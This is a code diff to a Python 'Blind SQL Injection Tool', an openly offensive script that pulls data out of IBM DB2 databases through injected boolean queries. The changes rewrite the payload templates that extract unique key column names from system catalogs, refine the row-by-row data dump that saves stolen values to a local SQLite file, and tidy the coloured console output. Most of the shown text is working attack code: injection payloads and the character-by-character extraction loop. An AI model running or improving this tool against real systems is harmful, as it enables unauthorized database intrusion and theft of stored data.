@@ -94,6 +94,18 @@ class Colors:
     CROSSED = "\033[9m"
     END = "\033[0m"
 
+def print_green(msg):
+    print(f"{Colors.GREEN}{msg}{Colors.END}")
+
+def print_red(msg):
+    print(f"{Colors.RED}{msg}{Colors.END}")
+
+def print_yellow(msg):
+    print(f"{Colors.YELLOW}{msg}{Colors.END}")
+    
+def print_blue(msg):
+    print(f"{Colors.LIGHT_BLUE}{msg}{Colors.END}")    
+    
 
 class ArgumentProcessor:
     def __init__(self):
@@ -550,7 +562,7 @@ class BlindSQLInjector:
             select_db=select_db_, 
             select_table=select_table_,
             select_column=select_column_,
-            PrimaryKey=PrimaryKey_ if PrimaryKey_ is not None else ""
+            PrimaryKey=PrimaryKey_
             )
         
         
@@ -603,27 +615,34 @@ class BlindSQLInjector:
 
 
         if self.args.dump:#########################
-            print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} DB2 Data Primary Key Extraction{self.args.select_db}.{self.args.select_table} {Colors.END}\n")
             payloads_pk = {
                 'PK': {
-                    'len': "(SELECT LENGTH(colname) FROM (SELECT ROW_NUMBER() OVER(ORDER BY colseq) r, colname FROM syscat.keycoluse WHERE constname = (SELECT constname FROM syscat.tabconst WHERE tabname = '{select_table}' AND type = 'P')) AS pk WHERE pk.r = {rows}) > {mid_val}",
-                    'pk': "ASCII(SUBSTR((SELECT colname FROM (SELECT ROW_NUMBER() OVER(ORDER BY colseq) r, colname FROM syscat.keycoluse WHERE constname = (SELECT constname FROM syscat.tabconst WHERE tabname = '{select_table}' AND type = 'P')) AS pk WHERE pk.r = {rows}), {substr_index}, 1)) > {mid_val}"
+                    'len': "(SELECT LENGTH(COL) FROM (SELECT REPLACE(REPLACE(colnames, '+', ''), '-', '') AS COL FROM syscat.indexes WHERE tabschema = '{select_db}' AND tabname = '{select_table}' AND uniquerule IN ('P','U') FETCH FIRST 1 ROW ONLY)) > {mid_val}",
+                    'pk': "ASCII(SUBSTR((SELECT REPLACE(REPLACE(COLNAMES,'+',''),'-','') FROM SYSCAT.INDEXES WHERE TABSCHEMA='{select_db}' AND TABNAME='{select_table}' AND UNIQUERULE IN ('P','U') FETCH FIRST 1 ROW ONLY),{substr_index},1)) > {mid_val}"
                 }
             }
             base_payload_pk = payloads_pk
             payload_template_pk = self.customize_payloads(condition, base_payload_pk)
 
             # 길이 확인
-            data_len = self.binary_search(0, max_len, parse_data, payload_template_pk['PK']['len'],None, 1, None,self.args.select_table, None, None)
+            data_len = self.binary_search(0, max_len, parse_data, payload_template_pk['PK']['len'],None, 1, self.args.select_db,self.args.select_table, None, None)
             name_str_pk = ''
 
+            # if not name_str_pk.strip():
+            #     name_str_pk = "1"
+
             # 값 확인
-            print("[+] ", end="", flush=True)
-            for substr_index in range(data_len):
-                char_code = self.binary_search(0, 127, parse_data, payload_template_pk['PK']['pk'],substr_index + 1, 1, None, self.args.select_table, None, None)
-                print(chr(char_code), end="", flush=True)
-                name_str_pk += chr(char_code)
-            print()
+            if data_len:
+                print("[+] Unique Column : ", end="", flush=True)
+                for substr_index in range(data_len):
+                    char_code = self.binary_search(0, 127, parse_data, payload_template_pk['PK']['pk'],substr_index + 1, 1, self.args.select_db, self.args.select_table, None, None)
+                    print(chr(char_code), end="", flush=True)
+                    name_str_pk += chr(char_code)
+                print()
+            else:
+                print_green("[*] No Unique Column")
+                print_green("[*] ORDER BY 1")
+                name_str_pk = "1"
 
         # 각 테이블을 처리 (또는 열이 추출되지 않으면 기본값)
         for select_table_one in select_tables: # 
@@ -638,12 +657,13 @@ class BlindSQLInjector:
             else:
                 row_count = 1 # basic은 1개
                 
-            print(start_row)
-            print(row_count)
-            print(f"{Colors.GREEN}[*] '{select_table_one}' Count: {str((row_count - start_row))}{Colors.END}"
-                  if select_table_one else f"{Colors.GREEN}[*] Record count: {row_count-1} {Colors.END}")
-
-            if self.args.dump:  # 데이터 덤프 전용####################################
+            print_green(f"\n[*] START ROW : {start_row},MAX ROW : {row_count}")
+            print_green(f"[*] '{select_table_one}' Count: {str((row_count - start_row))}"
+                  if select_table_one else f"{Colors.GREEN}[*] Record count: {row_count-1}")
+            
+            
+#################################### 데이터 덤프 전용 코드 ####################################
+            if self.args.dump: 
                 # SQLite에 테이블 생성
                 if self.args.select_table and self.args.select_column:
                     self.db_manager.create_target_table(self.args.select_table, self.args.select_column)
@@ -651,15 +671,16 @@ class BlindSQLInjector:
                 for row_index in range(start_row, row_count):
                     row_data = {}
                     for clean_column in clean_columns[1:]: # 1부터 시작
-                        print("[+] ", end="", flush=True)            
-                        
+                        print(f"[+] [{row_index}] ", end="", flush=True)
+                        print(f"'{clean_column}'".ljust(15), end="", flush=True)
+                        print(f" : ", end="", flush=True)
                         # 길이 확인          
                         data_len = self.binary_search(0, max_len, parse_data, payload_template['Dump']['len'],None, row_index, self.args.select_db,self.args.select_table, clean_column, name_str_pk)
                         name_str = ''
 
                         for substr_index in range(data_len):
                             char_code = self.binary_search(0, 127, parse_data, payload_template['Dump']['dump'],substr_index + 1, row_index, self.args.select_db,self.args.select_table, clean_column, name_str_pk)
-                            print(chr(char_code), end="", flush=True)
+                            print(f"{chr(char_code)}", end="", flush=True)
                             name_str += chr(char_code)
                         print()
 
@@ -674,7 +695,6 @@ class BlindSQLInjector:
                         insert_query = f"INSERT INTO {self.args.select_table} ({column_names}) VALUES ({placeholders})"
                         self.db_manager.cursor.execute(insert_query, values)
                         self.db_manager.conn.commit()
-                    print(f"[*] END ROW COUNT:[{row_index}]")
 
             else: ## basic, dbs , tables, columns Start
                 for row_index in range(start_row, row_count):
@@ -711,7 +731,7 @@ class BlindSQLInjector:
                         for name in name_tmp:
                             result_data[name] = result_tmp[num]
                             num += 1
-                        print(f"{Colors.LIGHT_RED}[+] {result_data}{Colors.END}")
+                        print_red(f"[+] {result_data}")
                     else:
                         if select_table_one:
                             result_data[select_table_one] = result_tmp
@@ -719,24 +739,24 @@ class BlindSQLInjector:
                             result_data[list(name_tmp)[0]] = result_tmp
 
                 if select_table_one:
-                    print(f"{Colors.LIGHT_RED}[+] '{select_table_one}': {result_data[select_table_one]}{Colors.END}")
+                    print_red(f"[+] '{select_table_one}': {result_data[select_table_one]}")
                 else:
                     if not self.args.basic:
                         first_name = list(name_tmp)[0]
-                        print(f"{Colors.LIGHT_RED}[+] '{first_name}' data: {result_data[first_name]}{Colors.END}")
+                        print_red(f"[+] '{first_name}' data: {result_data[first_name]}")
                                                 
                         result_tmp = []  # 다음 테이블에 대한 재설정
 
         # 최종 결과를 표시
-        print(f"\n{Colors.LIGHT_BLUE}[+] Final Results{Colors.END}")
+        print_blue(f"\n[+] Final Results")
         for key, value in result_data.items():
-            print(f"{Colors.GREEN}{Colors.BOLD}{key}:{Colors.END} {Colors.RED}{value}{Colors.END}")
-        print(f"\n{Colors.LIGHT_BLUE}[+] SQLite storage complete!{Colors.END}\n")
+            print_green(f"{Colors.GREEN}{Colors.BOLD}{key}:{Colors.END} {Colors.RED}{value}{Colors.END}")
+        print_blue(f"\n[+] SQLite storage complete!\n")
 
 def main():
-    print(f"\n{Colors.LIGHT_BLUE}{Colors.BOLD}=================================================================={Colors.END}")
-    print(f"{Colors.LIGHT_BLUE}{Colors.BOLD}                    Blind SQL Injection Tool                    {Colors.END}")
-    print(f"{Colors.LIGHT_BLUE}{Colors.BOLD}=================================================================={Colors.END}\n")
+    print_blue(f"\n{Colors.BOLD}==================================================================")
+    print_blue(f"{Colors.BOLD}                    Blind SQL Injection Tool                    ")
+    print_blue(f"{Colors.BOLD}==================================================================\n")
     
     # 프로세스 인수
     arg_processor = ArgumentProcessor()
